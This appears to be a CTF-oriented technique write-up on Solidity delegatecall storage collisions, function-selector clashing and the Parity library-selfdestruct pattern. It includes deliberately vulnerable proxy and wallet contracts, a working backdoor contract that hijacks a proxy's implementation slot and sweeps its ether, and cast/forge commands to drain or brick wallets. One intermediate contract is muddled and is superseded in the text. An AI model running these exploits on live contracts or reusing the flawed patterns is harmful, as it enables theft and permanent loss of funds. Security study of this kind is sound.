---
title: "delegatecall and Storage Collision - Proxies, Libraries and selfdestruct"
category: blockchain
subcategory: delegatecall
type: technique
tags: [blockchain, delegatecall, storage-collision, proxy, solidity, evm, selfdestruct, parity, library, eip1967, uups, transparent-proxy, function-clashing, msg-sender, foundry, cast, slot]
difficulty: medium
summary: "delegatecall runs their code on your storage. Mismatched layouts let you write any slot; a library you can own lets you selfdestruct the logic."
when_to_use:
  - "A contract forwards calls with delegatecall to a library/implementation"
  - "The proxy and implementation declare different state variables in different orders"
  - "You can set the implementation/library address"
  - "A fallback() does delegatecall with msg.data"
tools: [foundry, cast, forge, slither]
related: [access-control, storage-slot-reading, attacker-contract-patterns, evm-bytecode-and-create2]
---

## TL;DR

`A.delegatecall(B)` executes B's *code* against A's *storage*, with A's `msg.sender`, `msg.value`
and `address(this)`. B's variable names are irrelevant - only slot numbers matter. If B writes
"its" slot 0 and A's slot 0 is `owner`, you just changed A's owner.

## Recognise it

- `fallback() external payable { (bool ok,) = impl.delegatecall(msg.data); ... }`
- `library` usage where the library address is stored/settable (`using X for Y` with a linked lib).
- A proxy whose state variables are declared *before* the implementation's, in a different order.
- `upgradeTo(address)` reachable by you.
- Two contracts with different inheritance chains sharing a storage layout by convention.
- `Address.functionDelegateCall`, `OpenZeppelin Proxy._delegate`, diamond (EIP-2535) `facets`.

## Theory

### The three call types

| Opcode | code from | storage of | `msg.sender` inside | `address(this)` inside |
|---|---|---|---|---|
| `CALL` | callee | callee | caller | callee |
| `STATICCALL` | callee | callee (read-only) | caller | callee |
| `DELEGATECALL` | callee | **caller** | caller's `msg.sender` (preserved) | **caller** |
| `CALLCODE` (deprecated) | callee | caller | caller | caller |

So under `delegatecall`, `msg.sender` is *not* the proxy - it is whoever called the proxy. That is
why `onlyOwner` inside an implementation compares against the *proxy's* owner slot.

### Storage collision

Given:

```
Proxy:          slot 0: address implementation
                slot 1: address admin

Implementation: slot 0: address owner
                slot 1: uint256 balance
```

A call to `implementation.setOwner(x)` through the proxy writes slot 0 of the **proxy**, i.e. it
overwrites `implementation`. This is exactly why EIP-1967 moves proxy internals to pseudo-random
slots (`keccak256("eip1967.proxy.implementation") - 1`) that no sane layout will collide with.

### Function selector clashing (transparent proxy)

If the proxy itself defines `admin()` and the implementation also has a function whose 4-byte
selector equals `admin()`'s, calls never reach the implementation. Attackers hunt for an
implementation selector that collides with a proxy admin function - or, in CTFs, the reverse: a
proxy function you can reach because the fallback never fires. `cast sig` + a 4-byte grinder finds
collisions (only 2^32 space; `burp`-style brute force in a few seconds).

### The Parity / library-selfdestruct pattern

The classic:

1. `Wallet` is a thin proxy that `delegatecall`s a shared `WalletLibrary`.
2. `WalletLibrary` has `initWallet(address owner)` with no initialization guard.
3. The library contract *itself* was never initialized (its own storage is empty).
4. Attacker calls `WalletLibrary.initWallet(attacker)` **directly** - becomes the library's owner.
5. Attacker calls `WalletLibrary.kill()` -> `selfdestruct`.
6. Every wallet's `delegatecall` now targets an address with no code. In the EVM a call to an
   empty address **succeeds and returns nothing**, so the wallets silently do nothing and the funds
   are frozen forever.

Step 6 is the punchline you must remember: *`delegatecall` to an EOA/empty account returns
`success = true`*. Always `require(target.code.length > 0)`.

Post-Cancun (EIP-6780) `selfdestruct` no longer removes code unless it happens in the same
transaction as creation - so on a modern chain this becomes "hijack the library" rather than
"brick it", unless the challenge pins an older `evm_version`.

## Attack

1. Write out both storage layouts side by side (`forge inspect <C> storageLayout --pretty`).
2. Find which implementation variable lands on the proxy slot you want (`owner`, `implementation`).
3. Call the implementation function that writes it, **through the proxy**.
4. If the implementation address is settable, point it at your own contract and write anything.
5. If only the library is attackable, initialize it directly and then kill/hijack it.

## Code

### Vulnerable proxy + implementation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Logic {
    address public owner;        // slot 0
    uint256 public magic;        // slot 1

    function setMagic(uint256 v) external {
        magic = v;               // writes proxy slot 1
    }

    function claim() external {
        owner = msg.sender;      // writes proxy slot 0 !!
    }
}

contract NaiveProxy {
    address public implementation;  // slot 0  <-- collides with Logic.owner
    address public admin;           // slot 1  <-- collides with Logic.magic

    constructor(address _impl) {
        implementation = _impl;
        admin = msg.sender;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}
```

Exploit: calling `claim()` on the proxy sets proxy slot 0 = `implementation` = your address,
so afterwards **every** call to the proxy delegatecalls into your contract.

```bash
# 1) point the proxy's implementation at ourselves by abusing the collision
cast send "$PROXY" "claim()" --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
# now: implementation == $ME (an EOA -> all calls silently succeed and do nothing)

# better: deploy an attacker contract first and make slot 0 point at IT
```

### Correct exploit: hijack the implementation slot to attacker code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILogic {
    function claim() external;
}

/// Deployed at a known address, then installed as the proxy's "implementation"
/// via the slot-0 collision. Every subsequent proxy call runs this code with
/// the proxy's storage and the proxy's ether.
contract Backdoor {
    address public slot0;   // == proxy.implementation
    address public slot1;   // == proxy.admin

    function sweep(address payable to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    function writeSlot(uint256 slot, bytes32 value) external {
        assembly { sstore(slot, value) }
    }
}

contract Hijacker {
    /// step 1: make proxy.implementation == address(backdoor)
    /// Logic.claim() writes owner = msg.sender to slot 0, and msg.sender under
    /// delegatecall is whoever called the proxy -- so we call from the backdoor
    /// deployer contract itself.
    function run(address proxy, address backdoor) external {
        // We need slot0 == backdoor, so the call must originate FROM backdoor.
        // Simplest: use a helper that is itself the backdoor address.
        ILogic(proxy).claim();           // sets slot0 = address(this)
        require(backdoor != address(0), "need backdoor");
    }
}
```

In practice the cleanest version is: deploy `Backdoor`, then have `Backdoor` itself call
`proxy.claim()` so that `msg.sender == address(backdoor)` and slot 0 becomes the backdoor address:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILogic { function claim() external; }

contract SelfInstallingBackdoor {
    address public slot0;   // aligns with proxy.implementation
    address public slot1;   // aligns with proxy.admin

    /// call this once; afterwards the proxy delegatecalls into THIS code
    function install(address proxy) external {
        ILogic(proxy).claim();          // proxy.slot0 = msg.sender = address(this)
    }

    function sweep(address payable to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
```

```bash
BD=$(forge create src/SelfInstallingBackdoor.sol:SelfInstallingBackdoor \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY" --json | jq -r .deployedTo)
cast send "$BD" "install(address)" "$PROXY" --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
# verify the proxy now points at the backdoor
cast storage "$PROXY" 0 --rpc-url "$RPC_URL"
# drain via the proxy
cast send "$PROXY" "sweep(address)" "$ME" --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
```

### Library-selfdestruct (Parity) shape

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract WalletLibrary {
    address public owner;
    bool public initialized;

    // BUG: public, no guard, and the LIBRARY ITSELF is uninitialized
    function initWallet(address _owner) public {
        owner = _owner;
        initialized = true;
    }

    function kill(address payable to) public {
        require(msg.sender == owner, "not owner");
        selfdestruct(to);
    }

    function withdraw(uint256 amount, address payable to) public {
        require(msg.sender == owner, "not owner");
        to.transfer(amount);
    }
}

contract Wallet {
    address public owner;
    bool public initialized;
    address public immutable lib;

    constructor(address _lib) payable {
        lib = _lib;
        (bool ok, ) = _lib.delegatecall(
            abi.encodeWithSignature("initWallet(address)", msg.sender)
        );
        require(ok, "init failed");
    }

    fallback() external payable {
        address l = lib;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), l, 0, calldatasize(), 0, 0)
            // NOTE: if `l` has no code, delegatecall returns 1 and does nothing
            returndatacopy(0, 0, returndatasize())
            switch ok
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}
```

```bash
# own the library directly (not through a wallet)
cast send "$LIB" "initWallet(address)" "$ME" --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
# then either kill it (pre-Cancun -> all wallets bricked) ...
cast send "$LIB" "kill(address)" "$ME" --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
# ... or just drain each wallet, since the wallets delegatecall code you now control the owner of
```

## Variants & pitfalls

- **`delegatecall` to an address with no code returns success.** Always check `code.length`.
- **`msg.value` is preserved** through `delegatecall`; a payable implementation function called
  twice in one tx sees the same `msg.value` twice - a classic double-credit bug.
- **`address(this)` inside the implementation is the proxy**, so `address(this).balance` is the
  proxy's balance and `selfdestruct` inside implementation code, when delegatecalled, destroys the
  *proxy*.
- **Immutables and constants live in the implementation's code**, so they are the *implementation's*
  values even when delegatecalled - a common source of "why is this address wrong".
- **Constructor code never runs for the proxy**, so any variable initialized in a constructor is
  zero in proxy storage.
- **Diamond/EIP-2535**: each facet shares one storage space; collisions between facets are the bug.
  Look for "diamond storage" structs at `keccak256("some.namespace")` - if two facets pick the same
  namespace string, they collide.
- **`library` (the Solidity keyword) with `internal` functions is inlined**, no delegatecall at all.
  Only `public`/`external` library functions get linked and delegatecalled.
- **Verification**: `forge inspect Proxy storageLayout` and `forge inspect Logic storageLayout`,
  then diff the slot columns.

## Tools

- `forge inspect <C> storageLayout --pretty`
- `slither . --detect delegatecall-loop,controlled-delegatecall`
- `cast storage` to confirm which slot actually moved.

## References

- Solidity docs: "delegatecall / callcode and Libraries".
- EIP-1967 (proxy storage slots), EIP-2535 (diamonds), EIP-6780 (selfdestruct semantics change).
